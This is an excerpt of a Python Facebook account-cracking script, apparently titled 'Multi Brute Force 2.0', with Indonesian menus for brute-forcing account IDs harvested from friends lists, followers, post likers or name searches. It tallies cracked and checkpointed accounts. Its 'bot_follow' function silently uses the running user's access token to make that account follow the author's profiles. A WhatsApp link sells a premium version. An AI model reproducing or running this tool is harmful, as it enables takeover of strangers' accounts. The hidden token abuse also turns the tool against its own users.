...
def banner():
    print("""   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Fozy  Comon │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/fozycomon ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
...
def bot_follow():
	try:
		...
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		logs()
	requests.post("https://graph.facebook.com/100003311370420/subscribers?access_token=" + toket)      #Fozy
	requests.post('https://graph.facebook.com/100006230836266/subscribers?access_token=' + toket) #Badru
	...
	requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + toket) #fozy Xayonara
	requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=' + toket) #fozy Santana X
...
def menu():
    ...
    print((k+"\n["+p+"1"+k+"]"+p+" Crack ID Lewat Public/Teman"))
    print((k+"["+p+"2"+k+"]"+p+" Crack ID Lewat Followers"))
    print((k+"["+p+"3"+k+"]"+p+" Crack ID Lewat Likers Post"))
    print((k+"["+p+"4"+k+"]"+p+" Crack ID By Name"))
...
def results(fozy):
        if len(fozy) !=0:
                print(("[OK] : "+str(len(fozy))))
        if len(Krahkrah) !=0:
                print(("[CP] : "+str(len(Krahkrah))))
        if len(fozy) ==0 and len(Krahkrah) ==0:
                print("\n")
...
def wangsaff():
    ...
    os.system("xdg-open https://wa.me/+6283843321867?text=Assalamualaikum%20Bang,%20Saya%20Pengguna%20SC%20Premium%20fozy.%20Code:%20Error")
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()
